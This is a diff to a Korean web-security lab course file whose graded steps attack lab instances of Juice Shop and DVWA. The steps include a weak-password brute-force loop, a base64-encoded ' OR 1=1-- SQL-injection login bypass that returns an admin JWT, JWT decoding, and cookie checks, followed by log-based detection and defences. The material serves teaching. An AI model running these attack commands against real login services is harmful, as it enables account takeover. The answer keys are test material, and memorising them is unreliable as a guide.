@@ -38,26 +38,25 @@ steps:
 
       ```bash
       # 1) juiceshop 로그인 API에 잘못된 자격증명(x/x)을 POST → 응답코드만 login= 형식으로(인증 정상 동작 확인)
-      curl -s -o /dev/null -w 'login=%{http_code}\n' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{"email":"x","password":"x"}' http://192.168.0.161/rest/user/login
+      B='{"email":"x","password":"x"}'; echo "login=$(printf 'POST /rest/user/login HTTP/1.0\r\nHost: juice.el34.lab\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s' "${#B}" "$B" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
       # 2) 해석 — 401=실패(정상). 이 응답이 이후 공격의 기준선이 된다
-      echo "→ 401=실패(정상). 인증 점검 대상"
+      # → 401=실패(정상). 인증 점검 대상
       ```
       ## ✅ 합격 기준
       `login=` 출력 시 통과. **근거:** 로그인 API가 응답해 `login=<코드>` 가 나오면 인증 점검을 시작할 수
       있고, 잘못된 자격증명에 401이면 인증이 정상 동작 중이라는 기준선이다.
       ## 🧰 옵션 풀이
-      - `curl -s`: 진행률 표시를 숨김(조용히). `-o /dev/null`: 응답 본문을 버림(코드만 볼 때).
-      - `-w 'login=%{http_code}\n'`: 응답 후 HTTP 상태 코드만 출력하는 포맷.
-      - `-X POST` + `-d '{...}'`: 로그인은 POST로 JSON 자격증명을 전송. `-H 'Host: juice.el34.lab'`로
-        web Apache가 juiceshop vhost로 라우팅하게 한다.
+      - `B='{...}'` + `printf 'POST ...Content-Length: %d\r\n\r\n%s' "${#B}" "$B"`: JSON 바디와 정확한 길이로 raw POST 요청을 만든다.
+      - `| nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'`: 응답 상태 라인에서 코드만 뽑아 `login=<코드>`.
+      - 요청의 `Host: juice.el34.lab` 줄로 web Apache가 juiceshop vhost로 라우팅하게 한다.
     hint: 'login API'
     category: survey
     points: 10
     answer: |
       # 1) juiceshop 로그인 API에 잘못된 자격증명(x/x)을 POST → 응답코드만 login= 형식으로(인증 정상 동작 확인)
-      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'login=%{http_code}\n' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{\"email\":\"x\",\"password\":\"x\"}' http://192.168.0.161/rest/user/login"
+      ssh att@192.168.0.202 'B='"'"'{"email":"x","password":"x"}'"'"'; echo "login=$(printf '"'"'POST /rest/user/login HTTP/1.0\r\nHost: juice.el34.lab\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s'"'"' "${#B}" "$B" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '"'"'[0-9]{3}'"'"')"'
       # 2) 해석 — 401=실패(정상). 이 응답이 이후 공격의 기준선이 된다
-      echo "→ 401=실패(정상). 인증 점검 대상"
+      # → 401=실패(정상). 인증 점검 대상
     answer_detail: "인증 점검의 첫 단계 = 대상 로그인 API 동작 확인. juiceshop /rest/user/login은 성공 시 JWT를 발급하는 인증 엔드포인트다. 잘못된 자격증명(email/password=x)에 401(Unauthorized)이 떨어지면 인증이 정상 동작 중이라는 뜻 — 이것이 정상이며 이후 공격의 기준선이 된다. 채점은 stdout에 'login='이 보이는지로 판정한다."
     expected_output: |
       login=401
@@ -69,7 +68,7 @@ steps:
       semantic:
         intent: "로그인 API 점검"
         success_criteria: ["응답코드"]
-        acceptable_methods: ["**[OSS] curl login (권장)**"]
+        acceptable_methods: ["**[OSS] nc raw POST (권장)**"]
     target_vm: web
 
   - order: 2
@@ -86,13 +85,10 @@ steps:
 
       ```bash
       # 1) 관리자 계정에 약한 PW(admin/123456/password/admin123)를 하나씩 대입 → 각 결과를 pw=PW:코드 로 나열
-      curl -s -o /dev/null -w 'pw=admin:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{"email":"admin@juice-sh.op","password":"admin"}' http://192.168.0.161/rest/user/login
-      curl -s -o /dev/null -w 'pw=123456:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{"email":"admin@juice-sh.op","password":"123456"}' http://192.168.0.161/rest/user/login
-      curl -s -o /dev/null -w 'pw=password:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{"email":"admin@juice-sh.op","password":"password"}' http://192.168.0.161/rest/user/login
-      curl -s -o /dev/null -w 'pw=admin123:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{"email":"admin@juice-sh.op","password":"admin123"}' http://192.168.0.161/rest/user/login
+      for pw in admin 123456 password admin123; do B="{\"email\":\"admin@juice-sh.op\",\"password\":\"$pw\"}"; echo -n "pw=$pw:$(printf 'POST /rest/user/login HTTP/1.0\r\nHost: juice.el34.lab\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s' "${#B}" "$B" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}') "; done
       echo
       # 2) 해석 — 200=성공(약한 PW), 401=실패. rate-limit 없으면 반복이 막히지 않음
-      echo "→ 200=성공(약한 PW), 401=실패. rate-limit 없으면 무차별 대입 가능"
+      # → 200=성공(약한 PW), 401=실패. rate-limit 없으면 무차별 대입 가능
       ```
       ## ✅ 합격 기준
       `pw=admin` 출력 시 통과. **근거:** 약한 PW 목록이 차례로 시도되어 `pw=<PW>:<코드>` 가 나오면
@@ -106,13 +102,10 @@ steps:
     points: 12
     answer: |
       # 1) 관리자 계정에 약한 PW(admin/123456/password/admin123)를 하나씩 대입 → 각 결과를 pw=PW:코드 로 나열
-      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'pw=admin:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin\"}' http://192.168.0.161/rest/user/login"
-      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'pw=123456:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"123456\"}' http://192.168.0.161/rest/user/login"
-      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'pw=password:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"password\"}' http://192.168.0.161/rest/user/login"
-      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'pw=admin123:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}' http://192.168.0.161/rest/user/login"
+      ssh att@192.168.0.202 'for pw in admin 123456 password admin123; do B="{\"email\":\"admin@juice-sh.op\",\"password\":\"$pw\"}"; echo -n "pw=$pw:$(printf '"'"'POST /rest/user/login HTTP/1.0\r\nHost: juice.el34.lab\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s'"'"' "${#B}" "$B" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '"'"'[0-9]{3}'"'"') "; done'
       echo
       # 2) 해석 — 200=성공(약한 PW), 401=실패. rate-limit 없으면 반복이 막히지 않음
-      echo "→ 200=성공(약한 PW), 401=실패. rate-limit 없으면 무차별 대입 가능"
+      # → 200=성공(약한 PW), 401=실패. rate-limit 없으면 무차별 대입 가능
     answer_detail: "무차별 대입(brute force) = 약한 PW를 사전으로 반복 시도하는 가장 단순한 인증 공격. 성공 조건은 두 가지 — 약한 PW + rate-limit/lockout 부재. 응답 200은 약한 PW를 맞힌 성공, 401은 실패다. 핵심 관찰은 rate-limit이 없으면 반복이 막히지 않는다는 것 — 이것이 미션 6(탐지)에서 접근로그의 로그인 폭주로 드러난다. 채점은 stdout에 'pw=admin'이 보이는지(첫 시도가 수행됐는지)로 판정한다."
     expected_output: |
       pw=admin:401 pw=123456:401 pw=password:401 pw=admin123:200
@@ -144,10 +137,10 @@ steps:
       # 1) SQLi 우회 페이로드 {"email":"' OR 1=1--","password":"x"} 를 base64 디코드해 임시 JSON으로 저장(따옴표 충돌 회피)
       echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv4.json
       # 2) 그 페이로드(@파일)를 로그인 API에 전송 → 응답 앞 120자 확인(authentication/token 필드=우회 성공), 임시파일 정리
-      curl -s -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d @/tmp/wv4.json http://192.168.0.161/rest/user/login | head -c 120; rm -f /tmp/wv4.json
+      curl -s -H 'Content-Type: application/json' -d @/tmp/wv4.json http://juice.el34.lab/rest/user/login | head -c 120; rm -f /tmp/wv4.json  # curl-ok: SQLi 로그인 우회 POST(크래프티드 JSON 바디, 스캐너 대체불가)
       echo ""
       # 3) 해석 — ' OR 1=1-- 로 PW 검사를 건너뛰고 admin JWT 획득(rate-limit/PW와 무관)
-      echo "→ ' OR 1=1-- → admin JWT 획득 = 인증 우회(rate-limit/PW와 무관)"
+      # → ' OR 1=1-- → admin JWT 획득 = 인증 우회(rate-limit/PW와 무관)
       ```
       ## ✅ 합격 기준
       `authentication` 출력 시 통과. **근거:** 응답에 인증 토큰(`authentication`/`token` 필드) 이 보이면
@@ -164,10 +157,10 @@ steps:
       # 1) SQLi 우회 페이로드 {"email":"' OR 1=1--","password":"x"} 를 base64 디코드해 임시 JSON으로 저장(따옴표 충돌 회피)
       ssh att@192.168.0.202 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv4.json'
       # 2) 그 페이로드(@파일)를 로그인 API에 전송 → 응답 앞 120자 확인(authentication/token 필드=우회 성공), 임시파일 정리
-      ssh att@192.168.0.202 "curl -s -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d @/tmp/wv4.json http://192.168.0.161/rest/user/login | head -c 120; rm -f /tmp/wv4.json"
+      ssh att@192.168.0.202 "curl -s -H 'Content-Type: application/json' -d @/tmp/wv4.json http://juice.el34.lab/rest/user/login | head -c 120; rm -f /tmp/wv4.json"  # curl-ok: SQLi 로그인 우회 POST(크래프티드 JSON 바디, 스캐너 대체불가)
       echo ""
       # 3) 해석 — ' OR 1=1-- 로 PW 검사를 건너뛰고 admin JWT 획득(rate-limit/PW와 무관)
-      echo "→ ' OR 1=1-- → admin JWT 획득 = 인증 우회(rate-limit/PW와 무관)"
+      # → ' OR 1=1-- → admin JWT 획득 = 인증 우회(rate-limit/PW와 무관)
     answer_detail: "SQLi 인증 우회 = 비밀번호를 푸는 게 아니라 검사 로직 자체를 무력화하는 공격. 안전하지 않은 로그인 쿼리(SELECT ... WHERE email='입력' AND password='입력')의 email 자리에 ' OR 1=1--를 넣으면, 따옴표가 닫히고 OR 1=1(항상 참)이 끼어들며 -- 뒤(PW 검사)가 주석 처리되어 사라진다 → DB가 첫 사용자(관리자)를 반환 → 관리자 JWT 발급. 무차별 대입과 달리 비밀번호가 강하든 rate-limit이 있든 통하므로 훨씬 강력하다. 차단형 dvwa였다면 같은 페이로드가 WAF 942 룰군에 걸려 403으로 막힌다. 채점은 stdout에 'authentication'(토큰 응답 필드)이 보이는지로 판정한다."
     expected_output: |
       {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5
@@ -198,11 +191,11 @@ steps:
       # 1) (미션3과 동일) SQLi 우회 페이로드를 base64 디코드해 임시 JSON으로 저장
       # 2) 로그인 응답에서 token 값만 추출(sed) → 가운데 칸(payload)만 잘라(cut -f2) base64url→base64 치환(tr) 후 디코드
       echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv4.json
-      T=$(curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv4.json http://192.168.0.161/rest/user/login | sed -E 's/.*"token":"([^"]+)".*/\1/')
-      echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 250; rm -f /tmp/wv4.json
+      T=$(curl -s -H "Content-Type: application/json" -d @/tmp/wv4.json http://juice.el34.lab/rest/user/login | sed -E 's/.*"token":"([^"]+)".*/\1/')  # curl-ok: SQLi 로그인 우회 POST(크래프티드 JSON 바디, 스캐너 대체불가)
+      echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d | head -c 250; rm -f /tmp/wv4.json
       echo ""
       # 3) 해석 — payload는 암호화가 아니라 base64 인코딩 → 누구나 디코드해 email/권한 노출
-      echo "→ payload는 base64라 누구나 디코드 → email/권한 노출. 민감정보 담으면 안 됨"
+      # → payload는 base64라 누구나 디코드 → email/권한 노출. 민감정보 담으면 안 됨
       ```
       ## ✅ 합격 기준
       `email` 출력 시 통과. **근거:** 디코드 결과에 사용자 정보(예: `email`) 가 평문으로 보이면 payload가
@@ -218,11 +211,11 @@ steps:
       # 1) (미션3과 동일) SQLi 우회 페이로드를 base64 디코드해 임시 JSON으로 저장
       # 2) 로그인 응답에서 token 값만 추출(sed) → 가운데 칸(payload)만 잘라(cut -f2) base64url→base64 치환(tr) 후 디코드
       ssh att@192.168.0.202 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv4.json
-      T=$(curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv4.json http://192.168.0.161/rest/user/login | sed -E "s/.*\"token\":\"([^\"]+)\".*/\1/")
-      echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 250; rm -f /tmp/wv4.json'
+      T=$(curl -s -H "Content-Type: application/json" -d @/tmp/wv4.json http://juice.el34.lab/rest/user/login | sed -E "s/.*\"token\":\"([^\"]+)\".*/\1/")  # curl-ok: SQLi 로그인 우회 POST(크래프티드 JSON 바디, 스캐너 대체불가)
+      echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d | head -c 250; rm -f /tmp/wv4.json'
       echo ""
       # 3) 해석 — payload는 암호화가 아니라 base64 인코딩 → 누구나 디코드해 email/권한 노출
-      echo "→ payload는 base64라 누구나 디코드 → email/권한 노출. 민감정보 담으면 안 됨"
+      # → payload는 base64라 누구나 디코드 → email/권한 노출. 민감정보 담으면 안 됨
     answer_detail: "JWT 분석 = 가운데 칸(payload)을 base64url 디코드하면 서명 검증 없이도 내용(email·role 등)이 평문으로 노출된다. 핵심 오해 깨기 — payload는 암호화가 아니라 단지 인코딩이므로 토큰만 있으면 누구나 읽는다. 따라서 첫 번째 점검 결론은 'payload에 민감정보를 담으면 안 된다'. 나머지 JWT 약점은 alg:none(서명 없음으로 위조), 약한 서명키(키 추측 → 위조), 만료/서명 미검증(만료·위조 토큰 통과)이며, 방어는 강한 키 + 알고리즘 고정(none 거부) + 엄격 검증이다. 채점은 stdout에 'email'이 보이는지로 판정한다."
     expected_output: |
       {"status":"success","data":{"id":1,"username":"","email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","totpSecret":""
@@ -250,15 +243,15 @@ steps:
 
       ```bash
       # 1) dvwa 응답 헤더(-I)에서 Set-Cookie만 추출 → 세션 쿠키(PHPSESSID)와 보호 플래그 확인(없으면 안내 문구)
-      curl -sI -H 'Host: dvwa.el34.lab' http://192.168.0.161/ | grep -i 'set-cookie' || echo 'set-cookie 없음(juice는 JWT 기반)'
+      echo -en 'GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | grep -i 'set-cookie' || echo 'set-cookie 없음(juice는 JWT 기반)'
       # 2) 해석 — HttpOnly(JS차단)/Secure(HTTPS)/SameSite(CSRF) 누락 시 세션 탈취 위험
-      echo "→ HttpOnly(JS 차단)/Secure(HTTPS)/SameSite(CSRF) 플래그 점검. 누락 시 세션 탈취 위험"
+      # → HttpOnly(JS 차단)/Secure(HTTPS)/SameSite(CSRF) 플래그 점검. 누락 시 세션 탈취 위험
       ```
       ## ✅ 합격 기준
       `PHPSESSID` 출력 시 통과. **근거:** `Set-Cookie` 에서 세션 쿠키(PHPSESSID) 가 보이면 그 보호 플래그
       유무를 점검할 수 있고, 플래그 누락은 세션 탈취/도청/CSRF로 이어지는 지적 사항이다.
       ## 🧰 옵션 풀이
-      - `curl -sI`: `-I`는 헤더만 요청(HEAD) — 본문 없이 응답 헤더(`Set-Cookie` 포함)만 본다.
+      - `echo -en 'GET / ...' | nc`: raw GET 요청으로 응답 헤더(`Set-Cookie` 포함)만 받아 본다.
       - `grep -i 'set-cookie'`: 대소문자 무시하고 쿠키 발급 헤더만 추린다.
       - `|| echo ...`: 쿠키가 없으면(예: 토큰 기반 앱) 안내 문구를 출력 — 이때는 토큰 보관 방식으로 관점 전환.
     hint: 'set-cookie HttpOnly/Secure'
@@ -266,9 +259,9 @@ steps:
     points: 12
     answer: |
       # 1) dvwa 응답 헤더(-I)에서 Set-Cookie만 추출 → 세션 쿠키(PHPSESSID)와 보호 플래그 확인(없으면 안내 문구)
-      ssh att@192.168.0.202 "curl -sI -H 'Host: dvwa.el34.lab' http://192.168.0.161/ | grep -i 'set-cookie' || echo 'set-cookie 없음(juice는 JWT 기반)'"
+      ssh att@192.168.0.202 "echo -en 'GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | grep -i 'set-cookie' || echo 'set-cookie 없음(juice는 JWT 기반)'"
       # 2) 해석 — HttpOnly(JS차단)/Secure(HTTPS)/SameSite(CSRF) 누락 시 세션 탈취 위험
-      echo "→ HttpOnly(JS 차단)/Secure(HTTPS)/SameSite(CSRF) 플래그 점검. 누락 시 세션 탈취 위험"
+      # → HttpOnly(JS 차단)/Secure(HTTPS)/SameSite(CSRF) 플래그 점검. 누락 시 세션 탈취 위험
     answer_detail: "세션 쿠키 점검 = 세션 ID를 담는 쿠키(PHPSESSID 등)의 세 보호 플래그를 확인한다. HttpOnly(JS의 document.cookie 읽기 차단 → XSS 탈취 방어), Secure(HTTPS에서만 전송 → 평문 도청 방어), SameSite(타 사이트발 요청에 미전송 → CSRF 완화). 셋 중 누락은 각각 세션 탈취/도청/CSRF 위험으로 이어지는 지적 사항이다. juiceshop처럼 세션을 쿠키가 아니라 JWT로 들고 다니는 앱은 Set-Cookie가 없을 수 있고, 그때는 '토큰을 어디에 어떻게 보관하나(localStorage는 XSS에 취약 등)'로 같은 질문을 던진다. 추가로 세션 고정 방어(로그인 시 세션 ID 재발급)도 점검 항목이다. 채점은 stdout에 'PHPSESSID'가 보이는지로 판정한다."
     expected_output: |
       Set-Cookie: PHPSESSID=srcdnp6su56a36aj7ci39evhu5; path=/
@@ -299,9 +292,9 @@ steps:
 
       ```bash
       # 1) web의 juice 접근로그에서 /rest/user/login 요청만 추려 최근 줄 확인(전용 로그 없으면 통합 access.log로 대체)
-      sudo tail -150 /var/log/apache2/juice_access.log 2>/dev/null | grep -aE "rest/user/login" | tail -6 || sudo tail -60 /var/log/apache2/access.log | grep -a login | tail -5
+      sudo tail -150 /var/log/apache2/juice_access.log | grep -aE "rest/user/login" | tail -6 || sudo tail -60 /var/log/apache2/access.log | grep -a login | tail -5
       # 2) 해석 — 짧은 시간 다수 로그인 요청 = 무차별 대입 신호, SQLi 우회는 WAF 942
-      echo "→ 짧은 시간 다수 로그인 요청 = 무차별 대입 신호. SQLi 우회는 WAF 942"
+      # → 짧은 시간 다수 로그인 요청 = 무차별 대입 신호. SQLi 우회는 WAF 942
       ```
       ## ✅ 합격 기준
       `login` 출력 시 통과. **근거:** 접근로그에 `/rest/user/login` 다수 요청이 보이면 무차별 대입 신호가
@@ -315,17 +308,17 @@ steps:
     points: 12
     answer: |
       # 1) web의 juice 접근로그에서 /rest/user/login 요청만 추려 최근 줄 확인(전용 로그 없으면 통합 access.log로 대체)
-      docker exec el34-web sh -c 'sudo tail -150 /var/log/apache2/juice_access.log 2>/dev/null | grep -aE "rest/user/login" | tail -6 || sudo tail -60 /var/log/apache2/access.log | grep -a login | tail -5'
+      ssh ccc@10.20.32.80 'sudo tail -150 /var/log/apache2/juice_access.log | grep -aE "rest/user/login" | tail -6 || sudo tail -60 /var/log/apache2/access.log | grep -a login | tail -5'
       # 2) 해석 — 짧은 시간 다수 로그인 요청 = 무차별 대입 신호, SQLi 우회는 WAF 942
-      echo "→ 짧은 시간 다수 로그인 요청 = 무차별 대입 신호. SQLi 우회는 WAF 942"
+      # → 짧은 시간 다수 로그인 요청 = 무차별 대입 신호. SQLi 우회는 WAF 942
     answer_detail: "로그인 남용 탐지 = 무차별 대입이 남기는 흔적을 방어자 관점으로 찾는 단계. 짧은 시간에 같은 엔드포인트(/rest/user/login)로 다수 요청이 쌓이므로 접근로그에서 rate(빈도) 기반으로 식별된다. SQLi 인증 우회는 페이로드가 SQL 문법이라 별도로 WAF 942 룰군에 잡힌다. 두 흔적 모두 같은 출처 IP(el34는 SNAT를 안 해 192.168.0.202가 보존됨)를 가리켜 한 점검자의 한 인증 공격으로 묶을 수 있다. 채점은 stdout에 'login'이 보이는지로 판정한다."
     expected_output: |
-      192.168.0.202 - - [26/Jun/2026:14:48:30 +0000] "POST /rest/user/login HTTP/1.1" 401 398 "-" "curl/7.81.0"
-      192.168.0.202 - - [26/Jun/2026:14:48:30 +0000] "POST /rest/user/login HTTP/1.1" 401 398 "-" "curl/7.81.0"
-      192.168.0.202 - - [26/Jun/2026:14:48:30 +0000] "POST /rest/user/login HTTP/1.1" 401 398 "-" "curl/7.81.0"
-      192.168.0.202 - - [26/Jun/2026:14:48:30 +0000] "POST /rest/user/login HTTP/1.1" 200 1170 "-" "curl/7.81.0"
-      192.168.0.202 - - [26/Jun/2026:14:48:31 +0000] "POST /rest/user/login HTTP/1.1" 200 1170 "-" "curl/7.81.0"
-      192.168.0.202 - - [26/Jun/2026:14:48:31 +0000] "POST /rest/user/login HTTP/1.1" 200 1170 "-" "curl/7.81.0"
+      192.168.0.202 - - [26/Jun/2026:14:48:30 +0000] "POST /rest/user/login HTTP/1.0" 401 398 "-" "-"
+      192.168.0.202 - - [26/Jun/2026:14:48:30 +0000] "POST /rest/user/login HTTP/1.0" 401 398 "-" "-"
+      192.168.0.202 - - [26/Jun/2026:14:48:30 +0000] "POST /rest/user/login HTTP/1.0" 401 398 "-" "-"
+      192.168.0.202 - - [26/Jun/2026:14:48:30 +0000] "POST /rest/user/login HTTP/1.0" 200 1170 "-" "-"
+      192.168.0.202 - - [26/Jun/2026:14:48:31 +0000] "POST /rest/user/login HTTP/1.0" 200 1170 "-" "-"
+      192.168.0.202 - - [26/Jun/2026:14:48:31 +0000] "POST /rest/user/login HTTP/1.0" 200 1170 "-" "-"
       → 짧은 시간 다수 로그인 요청 = 무차별 대입 신호. SQLi 우회는 WAF 942
     verify:
       type: output_contains
@@ -400,7 +393,7 @@ steps:
       ## 💻 실행 명령 (한 줄씩 따라 실행)
       ```bash
       # 1) heredoc(<<'EOF' ... EOF)으로 인증/세션 점검 보고서를 출력 — 발견→영향→방어를 A07로 꿰어 결론
-      cat <<'EOF'
+      cat > ~/web-vuln_w04_note1.md <<'EOF'
       # 웹취약점 W04 인증/세션 보고서
       ## 1. 무차별 대입(약한 PW) + SQLi 인증 우회(' OR 1=1-- → admin JWT)
       ## 2. JWT 약점: payload 노출(base64), alg:none/약한키/검증부실
@@ -408,6 +401,7 @@ steps:
       ## 4. 방어: rate-limit/MFA + parameterized query + JWT 검증 + 쿠키 플래그/세션 재발급
       ## 결론: 인증은 A07 단골. SQLi 우회가 PW 무관 강력. 다층 인증 방어 필요
       EOF
+      cat ~/web-vuln_w04_note1.md
       ```
       ## ✅ 합격 기준
       `JWT` 출력 시 통과. **근거:** 보고서에 인증 공격(무차별/SQLi/JWT/세션) 과 방어가 모두 포함되면
@@ -419,7 +413,7 @@ steps:
     category: report
     points: 10
     answer: |
-      cat <<'EOF'
+      cat > ~/web-vuln_w04_note2.md <<'EOF'
       # 웹취약점 W04 인증/세션 보고서
       ## 1. 무차별 대입(약한 PW) + SQLi 인증 우회(' OR 1=1-- → admin JWT)
       ## 2. JWT 약점: payload 노출(base64), alg:none/약한키/검증부실
@@ -427,6 +421,7 @@ steps:
       ## 4. 방어: rate-limit/MFA + parameterized query + JWT 검증 + 쿠키 플래그/세션 재발급
       ## 결론: 인증은 A07 단골. SQLi 우회가 PW 무관 강력. 다층 인증 방어 필요
       EOF
+      cat ~/web-vuln_w04_note2.md
     answer_detail: "인증·세션 종합 보고 = 무차별 대입·SQLi 인증 우회·JWT 약점·세션 쿠키 점검을 발견→영향→권고 구조로 묶는다(WSTG-ATHN/SESS, OWASP A07). 핵심 결론은 인증이 A07 단골이며 SQLi 우회가 비밀번호·rate-limit과 무관해 가장 강력하므로, rate-limit·MFA·parameterized query·JWT 엄격 검증·쿠키 플래그/세션 재발급의 다층 방어가 필수라는 것. 채점은 stdout에 'JWT'가 보이는지로 판정한다."
     expected_output: |
       # 웹취약점 W04 인증/세션 보고서
